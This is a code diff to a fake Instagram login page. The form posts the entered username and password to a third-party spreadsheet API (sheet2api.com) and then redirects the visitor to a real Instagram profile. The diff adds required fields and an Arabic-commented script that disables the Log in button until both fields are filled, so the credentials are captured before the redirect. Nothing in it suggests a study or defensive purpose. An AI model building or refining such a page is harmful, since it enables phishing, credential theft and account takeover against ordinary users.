@@ -15,11 +15,34 @@
         <div class="c-panel group">
           <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
           <form class="c-panel__form" data-spreadsheet-api="https://sheet2api.com/v1/VwsQbQB3SvK0/ig/%25D8%25A7%25D9%2584%25D9%2588%25D8%25B1%25D9%2582%25D8%25A91">
-            <input type="text" name="user" class="c-panel__input" placeholder="Phone number, username, or email">
-            <input type="password" name="code" class="c-panel__input" placeholder="Password">
-            <button class="c-btn" type="submit" onclick="window.location.href='https://www.instagram.com/onlyaya.72/';">Log in</button>
+            <input type="text" name="user" class="c-panel__input" placeholder="Phone number, username, or email" required>
+            <input type="password" name="code" class="c-panel__input" placeholder="Password" required>
+            <button id="submitButton" class="c-btn" type="submit" onclick="window.location.href='https://www.instagram.com/onlyaya.72/';" disabled>Log in</button>
             <span class="c-panel__span">OR</span>
           </form>
+          <script>
+            // تحديد الحقول والزر
+            const form = document.querySelector('.c-panel__form');
+            const submitButton = document.getElementById('submitButton');
+            const inputs = form.querySelectorAll('input');
+          
+            // دالة التحقق من الحقول
+            function checkInputs() {
+              let allFilled = true;
+              inputs.forEach(input => {
+                if (!input.value.trim()) { // لو في حقل فاضي
+                  allFilled = false;
+                }
+              });
+              submitButton.disabled = !allFilled; // تفعيل أو تعطيل الزر بناءً على حالة الحقول
+            }
+          
+            // متابعة التغيير في الحقول
+            inputs.forEach(input => {
+              input.addEventListener('input', checkInputs);
+            });
+          </script>
+          
           <script src="java.js"></script>
           <a href="#" class="c-panel__facebook">Login with Facebook</a>
           <a href="#" class="c-panel__forgot">Forgot password?</a>
